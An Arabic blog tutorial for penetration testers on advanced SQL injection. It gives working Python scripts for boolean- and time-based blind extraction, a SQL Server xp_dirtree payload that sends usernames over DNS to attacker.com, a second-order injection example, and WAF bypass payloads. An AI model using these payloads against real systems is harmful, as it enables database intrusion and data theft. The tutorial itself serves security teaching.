---
layout: blog
title: "SQL Injection تقنيات متقدمة: من Boolean-Based إلى Out-of-Band واستغلال Second-Order"
date: 2026-03-29T06:09:31Z
category: "تقنية"
excerpt: "SQL Injection لا تزال من أخطر الثغرات رغم مرور عقود على اكتشافها. التقنيات المتقدمة تتجاوز الاستغلال البسيط إلى أساليب معقدة كـ Time-Based Blind، وOut-of-Band، وSecond-Order Injection. في هذا المقال نستعرض تقنيات الاستغلال المتقدمة التي يحتاجها كل penetration tester محترف."
read_time: 8
tags: ["SQL Injection", "Web Security", "Penetration Testing", "Blind SQLi", "OWASP"]
slug: "advanced-sql-injection"
---

## فهم البيئة: من Union-Based إلى Blind Injection

عندما نتحدث عن SQL Injection المتقدم، نتجاوز الـ Union-Based البسيط. معظم التطبيقات الحديثة لا تعرض أخطاء SQL مباشرة، مما يجبرنا على استخدام Blind Injection.

الفرق الجوهري بين Boolean-Based وTime-Based هو طريقة استخراج البيانات. في Boolean-Based نعتمد على تغير سلوك التطبيق (محتوى مختلف، redirect، إلخ)، بينما في Time-Based نعتمد على فرق التوقيت.

```python
# Boolean-Based SQLi للكشف عن طول اسم قاعدة البيانات
import requests

url = "https://target.com/product?id=1"
for length in range(1, 20):
    payload = f"1' AND LENGTH(DATABASE())={length}-- -"
    response = requests.get(url, params={'id': payload})
    
    if "Product Found" in response.text:
        print(f"[+] Database name length: {length}")
        break
```

التقنية هنا تعتمد على مراقبة الـ response. إذا كان طول اسم قاعدة البيانات صحيحًا، سيظهر المنتج. وإلا، صفحة خطأ أو لا شيء.

## Time-Based Blind: الاستغلال عبر التأخير

عندما لا يوجد أي فرق في الـ response، نلجأ لـ Time-Based. نستخدم دوال مثل `SLEEP()` في MySQL أو `WAITFOR DELAY` في SQL Server أو `pg_sleep()` في PostgreSQL.

```python
import requests
import time

def extract_database_name():
    database_name = ""
    charset = "abcdefghijklmnopqrstuvwxyz0123456789_"
    
    for position in range(1, 20):
        for char in charset:
            payload = f"1' AND IF(SUBSTRING(DATABASE(),{position},1)='{char}',SLEEP(3),0)-- -"
            
            start = time.time()
            requests.get("https://target.com/product", params={'id': payload}, timeout=5)
            elapsed = time.time() - start
            
            if elapsed >= 3:
                database_name += char
                print(f"[+] Found char: {char} | Database: {database_name}")
                break
    
    return database_name
```

هذا الأسلوب بطيء لكنه فعال جدًا. المشكلة الوحيدة: الضوضاء في الشبكة قد تؤثر على الدقة. لذلك استخدم timeout مناسب وكرر الـ request إذا لزم الأمر.

## Out-of-Band (OOB): الاستغلال خارج النطاق

عندما يفشل كل شيء، نلجأ لـ OOB. هنا نجبر قاعدة البيانات على إرسال البيانات إلى خادم نتحكم فيه.

في SQL Server نستخدم `xp_dirtree` أو `xp_cmdshell`، وفي Oracle نستخدم `UTL_HTTP` أو `UTL_INADDR`.

```sql
-- SQL Server: تسريب البيانات عبر DNS
'; DECLARE @data VARCHAR(100);
SELECT @data = (SELECT TOP 1 username FROM users);
EXEC('master..xp_dirtree "\\'+@data+'.attacker.com\\share"');--
```

على جهازك، شغّل DNS server أو HTTP server لالتقاط الطلبات:

```bash
# استخدم tcpdump للمراقبة
sudo tcpdump -i eth0 -n port 53

# أو استخدم Python HTTP server
python3 -m http.server 80
```

ستصل البيانات كـ subdomain أو في الـ request path. هذا الأسلوب قوي لأنه لا يعتمد على response التطبيق.

## Second-Order SQL Injection: الاستغلال المؤجل

Second-Order من أصعب الثغرات اكتشافًا. البيانات المُدخلة في نقطة ما (مثل التسجيل) تُخزن في قاعدة البيانات، ثم تُستخدم لاحقًا في استعلام آخر بدون sanitization.

مثال: عند التسجيل، تدخل username يحتوي على payload:

```python
# خطوة 1: التسجيل
username = "admin'-- -"
email = "attacker@evil.com"
password = "Password123"

requests.post("https://target.com/register", data={
    'username': username,
    'email': email,
    'password': password
})
```

التطبيق يخزن `admin'-- -` في قاعدة البيانات. لاحقًا، عند استرجاع الملف الشخصي:

```sql
-- الاستعلام في الخلفية
SELECT * FROM profiles WHERE username = 'admin'-- -' AND user_id = 123;
```

الـ payload نشط الآن. تكتشف Second-Order عبر:
1. تتبع تدفق البيانات (data flow analysis)
2. اختبار جميع نقاط الإدخال واستخدامها لاحقًا
3. استخدام payloads مميزة (unique identifiers) لتتبعها

## التقنيات الدفاعية: ما الذي يجب أن تعرفه

كـ penetration tester، فهمك للدفاعات يحسن هجماتك:

**Prepared Statements**: أقوى دفاع. يفصل البيانات عن الاستعلام تمامًا.

**WAF Bypass**: معظم الـ WAFs تبحث عن patterns معروفة. استخدم:
- Encoding متعدد: `%25%32%37` بدلاً من `'`
- Case variation: `uNiOn sElEcT`
- Comments: `UN/**/ION SE/**/LECT`
- Alternative syntax: `||` بدلاً من `CONCAT`

```sql
-- Bypass مثال
1' /*!50000UNION*/ /*!50000SELECT*/ NULL,NULL,version()-- -
```

**Rate Limiting**: في Time-Based، الـ rate limiting يبطئ الاستغلال. استخدم distributed requests أو قلل عدد الطلبات بتحسين الـ charset المستخدم.

الخلاصة: SQL Injection المتقدم يتطلب صبرًا وفهمًا عميقًا لقواعد البيانات. كل DBMS له خصائصه وdocsالخاصة. اقرأ الوثائق، جرب في بيئة معملية، وطور أدواتك الخاصة.
